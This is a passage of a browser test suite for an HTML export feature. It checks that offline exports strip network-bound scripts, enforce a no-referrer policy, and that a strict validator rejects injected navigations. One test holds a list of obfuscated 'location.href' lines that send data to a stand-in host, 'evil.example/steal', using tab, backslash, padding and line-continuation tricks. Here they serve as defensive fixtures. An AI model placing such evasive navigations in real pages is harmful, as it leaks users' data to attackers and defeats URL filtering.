    // The costlier failure direction: a benign script that merely SHADOWS `location` / `open`
    // with local bindings must survive intact, or an ordinary authored document is silently
    // broken by the export.
    expect(exportedHtml).toContain("window.__cmhLocalShadowKept = location");
    expect(exportedHtml).toContain("window.__cmhShadowedHrefKept = location.href");
    // Removing a script is content loss, so the user is told rather than left to guess - and the
    // COUNT must be right, or a miscount regression would read as a pass. Matched with a word
    // boundary, since a plain substring would also be satisfied by "14 scripts ... removed.".
    await expect(page.locator("#toast")).toContainText(/\b9 scripts that load, prefetch, or navigate to the network were removed\./);
    // A navigation that does still happen (a user-clicked link, or a script that builds the
    // URL dynamically) must at least not leak where it came from. The fixture authors a
    // PERMISSIVE `unsafe-url` policy as a document meta, as the pragma spelling, on the anchor
    // itself, parked inside a `<template>` (which `querySelectorAll` does not descend into), AND
    // inside a `<noscript>` (real ELEMENTS to the export's DOMParser, whose scripting flag is off
    // - measured), so this fails unless the export really replaces the meta, strips the attribute,
    // and reaches all three placements - the last of which is what keeps the export from emitting
    // a file its own `--strict` run below then rejects (CMH-OFFLINE-10).
    const referrerMetas = exportedHtml.match(/<meta\b[^>]*\bname=["']referrer["'][^>]*>/gi) || [];
    expect(referrerMetas).toHaveLength(1);
    expect(referrerMetas[0]).toMatch(/content=["']no-referrer["']/i);
    expect(exportedHtml).not.toMatch(/content=["']unsafe-url["']/i);
    expect(exportedHtml).not.toMatch(/http-equiv=["']Referrer-Policy["']/i);
    expect(exportedHtml).not.toMatch(/\sreferrerpolicy\s*=/i);

    const exportedPath = path.join(outDir, "offline-navigation.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    // The strict validator must not bless a hand-authored offline file that keeps the same
    // shape: the strip and the gate have to agree, or the gate certifies a file the exporter
    // no longer protects. The scheme-only spelling is checked in the same direction, since a
    // gate that only knew `https://` would certify exactly what the exporter now removes.
    const smuggles = [
      'location.href = "https://evil.example/steal";',
      'location.href = "https:evil.example/steal";',
      'location.href = " https://evil.example/steal";',
      'location.href = "ht\ttps://evil.example/steal";',
      'location.href = "\\\\\\\\evil.example/steal";',
      'location.href = "\\//evil.example/steal";',
      'location.href = "\\\nhttps://evil.example/steal";',
    ];
    for (const [i, smuggle] of smuggles.entries()) {
      const smuggledPath = path.join(outDir, "offline-navigation-smuggled-" + i + ".html");
      fs.writeFileSync(smuggledPath, exportedHtml.replace(
        "</body>", "<script>" + smuggle + "</script></body>"));
      let smuggledOut = "";
      try {
        execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", smuggledPath], { cwd: SKILL, stdio: "pipe" });
        throw new Error("the strict validator accepted a smuggled top-level navigation: " + smuggle);
      } catch (e) {
        smuggledOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
      }
      // Match the specific navigation error, not just any validation failure - otherwise an
      // unrelated breakage would read as this gate working.
      expect(smuggledOut).toMatch(/matches a direct top-level navigation to a network URL/i);
    }

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => {
      const link = document.getElementById("docsLink");
      return {
        exfilRan: window.__cmhExfilRan === true,
        openExfilRan: window.__cmhOpenExfilRan === true,
        chainExfilRan: window.__cmhChainExfilRan === true,
        schemeOnlyExfilRan: window.__cmhSchemeOnlyExfilRan === true,
        paddedExfilRan: window.__cmhPaddedExfilRan === true,
        tabExfilRan: window.__cmhTabExfilRan === true,
        backslashExfilRan: window.__cmhBackslashExfilRan === true,
        escapedSlashExfilRan: window.__cmhEscapedSlashExfilRan === true,
        continuationExfilRan: window.__cmhContinuationExfilRan === true,
        schemeStringKept: window.__cmhSchemeStringKept,
        paddedStringKept: window.__cmhPaddedStringKept,
        benignKept: window.__cmhBenignLocationKept === true,
        localShadowKept: window.__cmhLocalShadowKept,
        localOpenArg: window.__cmhLocalOpenArg,
        shadowedHrefKept: window.__cmhShadowedHrefKept,
        // The anchor itself must survive with its href intact - only the permissive
        // referrerpolicy is taken away, so the export is not just deleting the link.
        linkHref: link && link.getAttribute("href"),
        linkPolicy: link && link.getAttribute("referrerpolicy"),
        docPolicy: (document.querySelector('meta[name="referrer"]') || {}).content,
      };
    });
    expect(state.exfilRan).toBe(false);
    expect(state.openExfilRan).toBe(false);
    expect(state.chainExfilRan).toBe(false);
    expect(state.schemeOnlyExfilRan).toBe(false);
    expect(state.paddedExfilRan).toBe(false);
    expect(state.tabExfilRan).toBe(false);
    expect(state.backslashExfilRan).toBe(false);
    expect(state.escapedSlashExfilRan).toBe(false);
    expect(state.continuationExfilRan).toBe(false);
    expect(state.schemeStringKept).toBe("https:");
    expect(state.paddedStringKept).toBe("  https://docs.example.org/guide");
    expect(state.benignKept).toBe(true);
    expect(state.localShadowKept).toBe("https://api.example.org/v1");
    expect(state.localOpenArg).toBe("https://docs.example.org/guide");
    expect(state.shadowedHrefKept).toBe("https://api.example.org/v1");
    expect(state.linkHref).toBe("https://docs.example.org/guide");
    expect(state.linkPolicy).toBeNull();
    expect(state.docPolicy).toBe("no-referrer");
    expect(page2.url()).toBe(fileUrl(exportedPath));
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("NonShareable export ignores region marker text in content (CMH-FWDCOMPAT-01)", async ({ page }) => {
  const staged = stageNonShareable({
    mutate: (html) => html.replace(
      /(<main\b[^>]*id="commentRoot"[\s\S]*?<!-- BEGIN: commentable-html - CONTENT[^>]*-->)[\s\S]*?(<!-- END: commentable-html - CONTENT -->)/,
      '$1\n<h1>Region marker prose</h1>\n<pre>\nBEGIN: commentable-html - CSS\n</pre>\n$2'
    ),
  });
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnSaveHtmlTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).toMatch(/<pre\b[\s\S]*BEGIN: commentable-html - CSS[\s\S]*<\/pre>/);
    expectForwardCompatibleContract(exportedHtml, "shareable");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});
